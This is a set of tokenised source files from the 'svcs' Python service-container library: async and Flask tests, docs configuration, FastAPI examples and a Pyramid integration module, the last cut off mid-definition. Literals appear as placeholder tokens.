registry , container ) : <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> assert container . _lazy_local_registry is None <EOL> cm = CloseMe ( ) <EOL> container . register_local_value ( int , <NUM_LIT> , on_registry_close = cm . close ) <EOL> assert container . _lazy_local_registry . _on_close <EOL> assert <NUM_LIT> == container . get ( int ) <EOL> container . close ( ) <EOL> assert not container . _lazy_local_registry . _on_close <EOL> assert cm . is_closed <EOL> def test_local_registry_is_lazy_but_only_once ( container ) : <EOL> assert container . _lazy_local_registry is None <EOL> container . register_local_value ( int , <NUM_LIT> ) <EOL> reg = container . _lazy_local_registry <EOL> container . register_local_value ( int , <NUM_LIT> ) <EOL> assert reg is container . _lazy_local_registry <EOL> @ pytest . mark . asyncio ( ) <EOL> class TestAsync : <EOL> async def test_async_factory ( self , registry , container ) : <EOL> async def factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> return Service ( ) <EOL> registry . register_factory ( Service , factory ) <EOL> svc = await container . aget ( Service ) <EOL> assert isinstance ( svc , Service ) <EOL> assert svc is ( await container . aget ( Service ) ) <EOL> async def test_aget_works_with_sync_factory ( self , registry , container ) : <EOL> registry . register_factory ( Service , Service ) <EOL> assert Service ( ) == ( await container . aget ( Service ) ) <EOL> async def test_aget_works_with_value ( self , registry , container ) : <EOL> registry . register_value ( Service , <NUM_LIT> ) <EOL> registry . register_value ( AnotherService , <NUM_LIT> ) <EOL> assert [ <NUM_LIT> , <NUM_LIT> ] == ( await container . aget ( Service , AnotherService ) ) <EOL> assert [ <NUM_LIT> , <NUM_LIT> ] == ( await container . aget ( Service , AnotherService ) ) <EOL> async def test_aget_abstract_works_with_value ( self , registry , container ) : <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> registry . register_value ( str , "<STR_LIT>" ) <EOL> assert [ <NUM_LIT> , "<STR_LIT>" ] == ( await container . aget_abstract ( int , str ) ) <EOL> assert [ <NUM_LIT> , "<STR_LIT>" ] == ( await container . aget_abstract ( int , str ) ) <EOL> async def test_aget_enter_false ( self , registry , container ) : <EOL> entered = False <EOL> @ asynccontextmanager <EOL> async def factory ( ) : <EOL> nonlocal entered <EOL> entered = True <EOL> yield <NUM_LIT> <EOL> registry . register_factory ( Service , factory , enter = False ) <EOL> cm = await container . aget ( Service ) <EOL> assert not entered <EOL> assert isinstance ( cm , AbstractAsyncContextManager ) <EOL> async with cm as i : <EOL> assert <NUM_LIT> == i <EOL> assert entered <EOL> async def test_passes_container_bc_name ( self , registry , container ) : <EOL> async def factory ( svcs_container ) : <EOL> return str ( svcs_container . get ( int ) ) <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> registry . register_factory ( str , factory ) <EOL> assert "<STR_LIT>" == await container . aget ( str ) <EOL> async def test_passes_container_bc_annotation ( self , registry , container ) : <EOL> async def factory ( foo : svcs . Container ) : <EOL> return str ( foo . get ( int ) ) <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> registry . register_factory ( str , factory ) <EOL> assert "<STR_LIT>" == await container . aget ( str ) <EOL> async def test_async_cleanup ( self , registry , container , close_me ) : <EOL> async def factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> yield Service ( ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> await close_me . aclose ( ) <EOL> registry . register_factory ( Service , factory ) <EOL> svc = await container . aget ( Service ) <EOL> assert <NUM_LIT> == len ( container . _on_close ) <EOL> assert Service ( ) == svc <EOL> assert not close_me . is_aclosed <EOL> await container . aclose ( ) <EOL> assert close_me . is_aclosed <EOL> assert not container . _instantiated <EOL> assert not container . _on_close <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_aclose_resilient ( <EOL> self , container , registry , caplog , close_me <EOL> ) : <EOL> def factory ( ) : <EOL> yield <NUM_LIT> <EOL> raise Exception <EOL> async def async_factory ( ) : <EOL> yield <NUM_LIT> <EOL> raise Exception <EOL> async def factory_no_boom ( ) : <EOL> yield <NUM_LIT> <EOL> await close_me . aclose ( ) <EOL> registry . register_factory ( Service , factory ) <EOL> registry . register_factory ( AnotherService , async_factory ) <EOL> registry . register_factory ( YetAnotherService , factory_no_boom ) <EOL> assert <NUM_LIT> == container . get ( Service ) <EOL> assert <NUM_LIT> == await container . aget ( AnotherService ) <EOL> assert <NUM_LIT> == await container . aget ( YetAnotherService ) <EOL> assert not close_me . is_aclosed <EOL> await container . aclose ( ) <EOL> assert ( <EOL> "<STR_LIT>" <EOL> == caplog . records [ <NUM_LIT> ] . svcs_service_name <EOL> ) <EOL> assert "<STR_LIT>" == caplog . records [ <NUM_LIT> ] . svcs_service_name <EOL> assert close_me . is_aclosed <EOL> assert not container . _instantiated <EOL> assert not container . _on_close <EOL> async def test_aping ( self , registry , container ) : <EOL> apinged = pinged = False <EOL> async def aping ( svc ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> nonlocal apinged <EOL> apinged = True <EOL> def ping ( svc ) : <EOL> nonlocal pinged <EOL> pinged = True <EOL> registry . register_value ( Service , Service ( ) , ping = aping ) <EOL> registry . register_value ( AnotherService , AnotherService ( ) , ping = ping ) <EOL> ( ap , p ) = container . get_pings ( ) <EOL> assert ap . is_async <EOL> assert not p . is_async <EOL> await ap . aping ( ) <EOL> await p . aping ( ) <EOL> assert pinged <EOL> assert apinged <EOL> async def test_none_is_a_valid_factory_result ( self , registry , container ) : <EOL> i = <NUM_LIT> <EOL> async def factory ( ) : <EOL> nonlocal i <EOL> i += <NUM_LIT> <EOL> yield None <EOL> registry . register_factory ( Service , factory ) <EOL> assert None is await container . aget ( Service ) <EOL> assert None is await container . aget ( Service ) <EOL> assert <NUM_LIT> == i <EOL> await container . aclose ( ) <EOL> async def test_local_factory_overrides_global_factory ( <EOL> self , registry , container <EOL> ) : <EOL> cm = CloseMe ( ) <EOL> container . register_local_factory ( <EOL> int , async_int_factory , on_registry_close = cm . aclose <EOL> ) <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> async with container : <EOL> assert <NUM_LIT> == await container . aget ( int ) <EOL> assert cm . is_aclosed <EOL> </s>
<s> from __future__ import annotations <EOL> from . import exceptions <EOL> from . _core import ( <EOL> Container , <EOL> RegisteredService , <EOL> Registry , <EOL> ServicePing , <EOL> ) <EOL> __all__ = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> try : <EOL> from . import aiohttp <EOL> except ImportError : <EOL> __all__ += [ "<STR_LIT>" ] <EOL> try : <EOL> from . import fastapi <EOL> except ImportError : <EOL> __all__ += [ "<STR_LIT>" ] <EOL> try : <EOL> from . import flask <EOL> except ImportError : <EOL> __all__ += [ "<STR_LIT>" ] <EOL> try : <EOL> from . import pyramid <EOL> except ImportError : <EOL> __all__ += [ "<STR_LIT>" ] <EOL> try : <EOL> from . import starlette <EOL> except ImportError : <EOL> __all__ += [ "<STR_LIT>" ] <EOL> </s>
<s> import sys <EOL> import typing <EOL> import pytest <EOL> import svcs <EOL> @ pytest . mark . skipif ( sys . version_info < ( <NUM_LIT> , <NUM_LIT> ) , reason = "<STR_LIT>" ) <EOL> def test_get_type_hints ( ) : <EOL> typing . get_type_hints ( svcs . Registry ) <EOL> typing . get_type_hints ( svcs . Container ) <EOL> typing . get_type_hints ( svcs . ServicePing ) <EOL> typing . get_type_hints ( svcs . RegisteredService ) <EOL> </s>
<s> from importlib import metadata <EOL> suppress_warnings = [ "<STR_LIT>" ] <EOL> extensions = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> myst_enable_extensions = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ogp_image = "<STR_LIT>" <EOL> templates_path = [ "<STR_LIT>" ] <EOL> source_suffix = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> master_doc = "<STR_LIT>" <EOL> project = "<STR_LIT>" <EOL> author = "<STR_LIT>" <EOL> copyright = f"<STR_LIT>" <EOL> release = metadata . version ( "<STR_LIT>" ) <EOL> version = release . rsplit ( "<STR_LIT>" , <NUM_LIT> ) [ <NUM_LIT> ] <EOL> if "<STR_LIT>" in release : <EOL> release = version = "<STR_LIT>" <EOL> exclude_patterns = [ "<STR_LIT>" ] <EOL> nitpick_ignore = [ <EOL> * [ ( "<STR_LIT>" , f"<STR_LIT>" ) for i in range ( <NUM_LIT> , <NUM_LIT> ) ] , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ] <EOL> add_function_parentheses = True <EOL> autodoc_typehints = "<STR_LIT>" <EOL> autodoc_typehints_description_target = "<STR_LIT>" <EOL> html_theme = "<STR_LIT>" <EOL> html_theme_options = { <EOL> "<STR_LIT>" : None , <EOL> "<STR_LIT>" : True , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> "<STR_LIT>" , <EOL> } , <EOL> } <EOL> html_logo = "<STR_LIT>" <EOL> html_static_path = [ "<STR_LIT>" ] <EOL> html_css_files = [ "<STR_LIT>" ] <EOL> htmlhelp_basename = "<STR_LIT>" <EOL> _descr = f"<STR_LIT>" <EOL> _title = "<STR_LIT>" <EOL> rst_epilog = <EOL> linkcheck_ignore = [ <EOL> r"<STR_LIT>" , <EOL> r"<STR_LIT>" , <EOL> ] <EOL> intersphinx_mapping = { <EOL> "<STR_LIT>" : ( "<STR_LIT>" , None ) , <EOL> "<STR_LIT>" : ( "<STR_LIT>" , None ) , <EOL> "<STR_LIT>" : ( "<STR_LIT>" , None ) , <EOL> "<STR_LIT>" : ( "<STR_LIT>" , None ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> None , <EOL> ) , <EOL> } <EOL> </s>
<s> from unittest . mock import Mock <EOL> import pytest <EOL> import svcs <EOL> from tests . helpers import nop <EOL> from tests . ifaces import AnotherService , Interface , Service <EOL> try : <EOL> import flask <EOL> from svcs . flask import teardown <EOL> except ImportError : <EOL> pytest . skip ( "<STR_LIT>" , allow_module_level = True ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _app ( ) : <EOL> return flask . Flask ( "<STR_LIT>" ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _clean_app_ctx ( registry , app ) : <EOL> svcs . flask . init_app ( app , registry = registry ) <EOL> with app . app_context ( ) as ctx : <EOL> yield ctx <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _container ( clean_app_ctx ) : <EOL> return svcs . flask . svcs_from ( ) <EOL> @ pytest . mark . usefixtures ( "<STR_LIT>" ) <EOL> class TestFlask : <EOL> def test_register_value_multiple ( self , registry ) : <EOL> registry . register_value ( Service , <NUM_LIT> ) <EOL> registry . register_value ( AnotherService , <NUM_LIT> ) <EOL> assert [ <NUM_LIT> , <NUM_LIT> ] == svcs . flask . get ( Service , AnotherService ) <EOL> assert [ <NUM_LIT> , <NUM_LIT> ] == svcs . flask . get ( Service , AnotherService ) <EOL> def test_cleanup_added ( self , registry , app ) : <EOL> cleanup1 = Mock ( ) <EOL> cleanup2 = Mock ( ) <EOL> def factory1 ( ) : <EOL> yield Service ( ) <EOL> cleanup1 ( ) <EOL> def factory2 ( ) : <EOL> yield AnotherService ( ) <EOL> cleanup2 ( ) <EOL> registry . register_factory ( Service , factory1 ) <EOL> svcs . flask . register_factory ( app , AnotherService , factory2 ) <EOL> svc1 = svcs . flask . get ( Service ) <EOL> svc2 = svcs . flask . get ( AnotherService ) <EOL> assert isinstance ( svc1 , Service ) <EOL> assert isinstance ( svc2 , AnotherService ) <EOL> assert <NUM_LIT> == len ( flask . g . svcs_container . _on_close ) <EOL> teardown ( None ) <EOL> cleanup1 . assert_called_once_with ( ) <EOL> cleanup2 . assert_called_once_with ( ) <EOL> def test_overwrite_value ( self , registry , app ) : <EOL> registry . register_value ( Interface , Service ( ) , ping = nop ) <EOL> assert isinstance ( svcs . flask . get ( Interface ) , Interface ) <EOL> container = svcs . flask . svcs_from ( ) <EOL> assert container . _instantiated <EOL> svcs . flask . overwrite_value ( Interface , AnotherService ( ) ) <EOL> assert not container . _instantiated <EOL> assert isinstance ( svcs . flask . get ( Interface ) , AnotherService ) <EOL> assert [ ] == svcs . flask . get_pings ( ) <EOL> def test_overwrite_factory ( self , app ) : <EOL> svcs . flask . register_value ( app , Interface , Service ( ) , ping = nop ) <EOL> assert isinstance ( svcs . flask . get ( Interface ) , Interface ) <EOL> container = svcs . flask . svcs_from ( ) <EOL> assert container . _instantiated <EOL> svcs . flask . overwrite_factory ( Interface , AnotherService ) <EOL> assert not container . _instantiated <EOL> assert isinstance ( svcs . flask . get ( Interface ) , AnotherService ) <EOL> assert [ ] == svcs . flask . get_pings ( ) <EOL> def test_cache ( self , app ) : <EOL> svcs . flask . register_factory ( app , Interface , Service ) <EOL> assert svcs . flask . get ( Interface ) is svcs . flask . get ( Interface ) <EOL> def test_not_found ( self ) : <EOL> with pytest . raises ( svcs . exceptions . ServiceNotFoundError ) : <EOL> svcs . flask . get ( Interface ) <EOL> def test_get_pingeable ( self , app ) : <EOL> svcs . flask . register_factory ( app , Service , Service ) <EOL> svcs . flask . register_factory ( <EOL> app , AnotherService , AnotherService , ping = nop <EOL> ) <EOL> assert [ AnotherService ] == [ <EOL> ping . _svc_type for ping in svcs . flask . get_pings ( ) <EOL> ] <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_teardown_warns_on_async_on_close ( self , container ) : <EOL> async def factory ( ) : <EOL> yield Service ( ) <EOL> container . registry . register_factory ( Service , factory ) <EOL> await container . aget ( Service ) <EOL> with pytest . warns ( UserWarning ) as wi : <EOL> teardown ( None ) <EOL> w = wi . pop ( ) <EOL> assert <NUM_LIT> == len ( wi . list ) <EOL> assert ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" == w . message . args [ <NUM_LIT> ] <EOL> ) <EOL> def test_register_factory_get_abstract ( self , registry , container ) : <EOL> registry . register_factory ( Interface , Service ) <EOL> svc = container . get_abstract ( Interface ) <EOL> assert isinstance ( svc , Interface ) <EOL> assert svc is svcs . flask . get_abstract ( Interface ) <EOL> def test_svcs_from ( self , container ) : <EOL> assert ( <EOL> container <EOL> is svcs . flask . svcs_from ( ) <EOL> is flask . g . svcs_container <EOL> is svcs . flask . svcs_from ( ) <EOL> ) <EOL> def test_local_proxy_container ( self , container ) : <EOL> assert ( <EOL> container <EOL> == flask . g . svcs_container <EOL> == svcs . flask . svcs_from ( ) <EOL> == svcs . flask . container <EOL> ) <EOL> def test_local_proxy_registry ( self , registry , app ) : <EOL> assert ( <EOL> registry <EOL> == svcs . flask . get_registry ( flask . current_app ) <EOL> == svcs . flask . get_registry ( app ) <EOL> == svcs . flask . get_registry ( ) <EOL> ) <EOL> class TestNonContextHelpers : <EOL> def test_get_registry ( self , registry , app ) : <EOL> svcs . flask . init_app ( app , registry = registry ) <EOL> assert registry is svcs . flask . get_registry ( app ) <EOL> def test_register_factory_helper ( self , registry , app ) : <EOL> svcs . flask . init_app ( app , registry = registry ) <EOL> svcs . flask . register_factory ( app , Interface , Service ) <EOL> assert Interface in registry . _services <EOL> def test_register_value_helper ( self , registry , app ) : <EOL> svcs . flask . init_app ( app , registry = registry ) <EOL> svcs . flask . register_value ( app , Interface , <NUM_LIT> ) <EOL> assert Interface in registry . _services <EOL> class TestInitApp : <EOL> def test_implicit_registry ( self ) : <EOL> app = flask . Flask ( "<STR_LIT>" ) <EOL> svcs . flask . init_app ( app ) <EOL> assert isinstance ( app . extensions [ "<STR_LIT>" ] , svcs . Registry ) <EOL> def test_explicit_registry ( self ) : <EOL> registry = svcs . Registry ( ) <EOL> app = flask . Flask ( "<STR_LIT>" ) <EOL> svcs . flask . init_app ( app , registry = registry ) <EOL> assert registry is app . extensions [ "<STR_LIT>" ] <EOL> class TestCloseRegistry : <EOL> def test_nop ( self ) : <EOL> app = flask . Flask ( "<STR_LIT>" ) <EOL> svcs . flask . close_registry ( app ) <EOL> def test_closes ( self , app ) : <EOL> close = Mock ( ) <EOL> svcs . flask . init_app ( app ) <EOL> svcs . flask . register_factory ( <EOL> app , Interface , Service , on_registry_close = close <EOL> ) <EOL> svcs . flask . close_registry ( app ) <EOL> assert close . called <EOL> </s>
<s> from __future__ import annotations <EOL> import os <EOL> from typing import AsyncGenerator <EOL> from fastapi import FastAPI <EOL> import svcs <EOL> config = { "<STR_LIT>" : os . environ . get ( "<STR_LIT>" , "<STR_LIT>" ) } <EOL> class Database : <EOL> @ classmethod <EOL> async def connect ( cls , db_url : str ) -> Database : <EOL> return Database ( ) <EOL> async def get_user ( self , user_id : int ) -> dict [ str , str ] : <EOL> return { } <EOL> @ svcs . fastapi . lifespan <EOL> async def lifespan ( <EOL> app : FastAPI , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ dict [ str , object ] , None ] : <EOL> async def connect_to_db ( ) -> Database : <EOL> return await Database . connect ( config [ "<STR_LIT>" ] ) <EOL> registry . register_factory ( Database , connect_to_db ) <EOL> yield { "<STR_LIT>" : "<STR_LIT>" } <EOL> app = FastAPI ( lifespan = lifespan ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def get_user ( user_id : int , services : svcs . fastapi . DepContainer ) -> dict : <EOL> db = await services . aget ( Database ) <EOL> try : <EOL> return { "<STR_LIT>" : await db . get_user ( user_id ) } <EOL> except Exception as e : <EOL> return { "<STR_LIT>" : e . args [ <NUM_LIT> ] } <EOL> </s>
<s> import sys <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing import Annotated <EOL> else : <EOL> from typing_extensions import Annotated <EOL> def nop ( * _ , ** __ ) : <EOL> pass <EOL> class CloseMe : <EOL> is_aclosed = is_closed = False <EOL> def close ( self ) : <EOL> self . is_closed = True <EOL> async def aclose ( self ) : <EOL> self . is_aclosed = True <EOL> </s>
<s> import contextlib <EOL> import sys <EOL> from typing import AsyncGenerator , Generator , NewType , Protocol <EOL> import svcs <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing import Annotated <EOL> else : <EOL> from typing_extensions import Annotated <EOL> reg = svcs . Registry ( ) <EOL> con = svcs . Container ( reg ) <EOL> reg . close ( ) <EOL> with contextlib . closing ( reg ) as reg : <EOL> ... <EOL> with reg as reg : <EOL> reg . register_factory ( int , int ) <EOL> async def func ( ) -> None : <EOL> await reg . aclose ( ) <EOL> await con . aclose ( ) <EOL> async with svcs . Registry ( ) as reg2 : <EOL> reg2 . register_factory ( int , int ) <EOL> async with svcs . Container ( reg2 ) as con2 : <EOL> a : int <EOL> b : str <EOL> c : bool <EOL> d : tuple <EOL> e : object <EOL> f : float <EOL> g : list <EOL> h : dict <EOL> i : set <EOL> j : bytes <EOL> a , b , c , d , e , f , g , h , i , j = await con2 . aget ( <EOL> int , str , bool , tuple , object , float , list , dict , set , bytes <EOL> ) <EOL> def gen ( ) -> Generator : <EOL> yield <NUM_LIT> <EOL> async def async_gen ( ) -> AsyncGenerator : <EOL> yield <NUM_LIT> <EOL> @ contextlib . asynccontextmanager <EOL> async def async_cm ( ) -> AsyncGenerator : <EOL> yield <NUM_LIT> <EOL> def factory_with_cleanup ( ) -> Generator [ int , None , None ] : <EOL> yield <NUM_LIT> <EOL> @ contextlib . contextmanager <EOL> def factory_with_cleanup_ctx ( ) -> Generator [ int , None , None ] : <EOL> yield <NUM_LIT> <EOL> def factory_that_takes_container_by_annotation ( foo : svcs . Container ) -> int : <EOL> return <NUM_LIT> <EOL> async def async_ping ( ) -> None : <EOL> pass <EOL> reg . register_value ( int , <NUM_LIT> ) <EOL> reg . register_value ( int , <NUM_LIT> , ping = lambda : None ) <EOL> reg . register_value ( int , <NUM_LIT> , ping = async_ping ) <EOL> reg . register_value ( int , gen ) <EOL> reg . register_factory ( str , str ) <EOL> reg . register_factory ( int , factory_with_cleanup ) <EOL> reg . register_factory ( int , factory_with_cleanup_ctx ) <EOL> reg . register_factory ( int , factory_with_cleanup , ping = async_ping ) <EOL> reg . register_factory ( str , async_gen ) <EOL> reg . register_factory ( str , async_cm ) <EOL> reg . register_value ( str , str , ping = lambda : None ) <EOL> con = svcs . Container ( reg ) <EOL> con . register_local_factory ( int , factory_with_cleanup ) <EOL> con . register_local_value ( int , <NUM_LIT> ) <EOL> o1 : object = con . get ( object ) <EOL> o2 : int = con . get ( int ) <EOL> a : int <EOL> b : str <EOL> c : bool <EOL> d : tuple <EOL> e : object <EOL> f : float <EOL> g : list <EOL> h : dict <EOL> i : set <EOL> j : bytes <EOL> a , b , c , d , e , f , g , h , i , j = con . get ( <EOL> int , str , bool , tuple , object , float , list , dict , set , bytes <EOL> ) <EOL> class P ( Protocol ) : <EOL> def m ( self ) -> None : ... <EOL> p : P = con . get_abstract ( P ) <EOL> con . close ( ) <EOL> with contextlib . closing ( svcs . Container ( reg ) ) as con : <EOL> ... <EOL> with svcs . Container ( reg ) as con : <EOL> i2 : int = con . get ( int ) <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> async def ctx ( ) -> None : <EOL> async with contextlib . aclosing ( svcs . Container ( reg ) ) : <EOL> ... <EOL> async with contextlib . aclosing ( svcs . Registry ( ) ) : <EOL> ... <EOL> S1 = Annotated [ str , "<STR_LIT>" ] <EOL> S2 = NewType ( "<STR_LIT>" , str ) <EOL> reg . register_value ( S1 , "<STR_LIT>" ) <EOL> reg . register_value ( S2 , "<STR_LIT>" ) <EOL> s1 : str = con . get ( S1 ) <EOL> s2 : str = con . get ( S2 ) <EOL> </s>
<s> from __future__ import annotations <EOL> from fastapi import FastAPI <EOL> from fastapi . responses import JSONResponse <EOL> import svcs <EOL> app = FastAPI ( ... ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def healthy ( services : svcs . fastapi . DepContainer ) -> JSONResponse : <EOL> ok : list [ str ] = [ ] <EOL> failing : list [ dict [ str , str ] ] = [ ] <EOL> code = <NUM_LIT> <EOL> for svc in services . get_pings ( ) : <EOL> try : <EOL> await svc . aping ( ) <EOL> ok . append ( svc . name ) <EOL> except Exception as e : <EOL> failing . append ( { svc . name : repr ( e ) } ) <EOL> code = <NUM_LIT> <EOL> return JSONResponse ( <EOL> content = { "<STR_LIT>" : ok , "<STR_LIT>" : failing } , status_code = code <EOL> ) <EOL> </s>
<s> from __future__ import annotations <EOL> from collections . abc import Callable <EOL> from contextlib import suppress <EOL> from typing import Any , Protocol , overload <EOL> import attrs <EOL> from pyramid . config import Configurator <EOL> from pyramid . registry import Registry <EOL> from pyramid . request import Request <EOL> from pyramid . response import Response <EOL> from pyramid . threadlocal import get_current_registry , get_current_request <EOL> import svcs <EOL> from . _core import ( <EOL> _KEY_CONTAINER , <EOL> _KEY_REGISTRY , <EOL> T1 , <EOL> T2 , <EOL> T3 , <EOL> T4 , <EOL> T5 , <EOL> T6 , <EOL> T7 , <EOL> T8 , <EOL> T9 , <EOL> T10 , <EOL> ) <EOL> def svcs_from ( request : Request | None = None ) -> svcs . Container : <EOL> if request is None : <EOL> request = get_current_request ( ) <EOL> return getattr ( request , _KEY_CONTAINER ) <EOL> def get_registry ( rh : PyramidRegistryHaver | None = None ) -> svcs . Registry : <EOL> registry = rh . registry if rh else get_current_registry ( ) <EOL> return registry [ _KEY_REGISTRY ] <EOL> def init ( <EOL> config : Configurator , <EOL> * , <EOL> registry : svcs . Registry | None = None , <EOL> tween_under : Any = None , <EOL> tween_over : Any = None , <EOL> ) -> None : <EOL> config . registry [ _KEY_REGISTRY ] = registry or svcs . Registry ( ) <EOL> config . add_tween ( <EOL> "<STR_LIT>" , over = tween_over , under = tween_under <EOL> ) <EOL> @ attrs . define <EOL> class ServicesTween : <EOL> handler : Callable [ [ Request ] , Response ] <EOL> registry : Registry <EOL> def __call__ ( self , request : Request ) -> Response : <EOL> def make_container ( request : Request ) -> svcs . Container : <EOL> con = svcs . Container ( self . registry [ _KEY_REGISTRY ] ) <EOL> request . add_finished_callback ( lambda _ : con . close ( ) ) <EOL> return con <EOL> request . set_property ( make_container , _KEY_CONTAINER , reify = True ) <EOL> return self . handler ( request ) <EOL> def register_factory ( <EOL> config : PyramidRegistryHaver , <EOL> svc_type : type , <EOL> factory : Callable , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> config . registry [ _KEY_REGISTRY ] . register_factory ( <EOL> svc_type , <EOL> factory , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> def register_value ( <EOL> config : PyramidRegistryHaver , <EOL> svc_type : type , <EOL> value : object , <EOL> * , <EOL> enter : bool = False , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> config . registry [ _KEY_REGISTRY ] . register_value ( <EOL> svc_type , <EOL> value , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> def close_registry ( rh : PyramidRegistryHaver ) -> None : <EOL> with suppress ( KeyError ) : <EOL> get_registry ( rh ) . close ( ) <EOL> class PyramidRegistryHaver ( Protocol ) : <EOL> registry : dict [ str , Any ] <EOL> def get_pings ( request : Request ) -> list [ svcs . ServicePing ] : <EOL> return svcs_from ( request ) . get_pings ( ) <EOL> def get_abstract ( request : Request , * svc_types : type ) -> Any : <EOL> return svcs_from ( request ) . get ( * svc_types ) <EOL> @ overload <EOL> def get ( request : Request , svc_type : type [ T1 ] , / ) -> T1 : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 ] : ... <EOL> @ overload <EOL> def get ( <EOL> request : Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> svc_type10 : type [ T10 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 ] : ... <EOL> def get ( 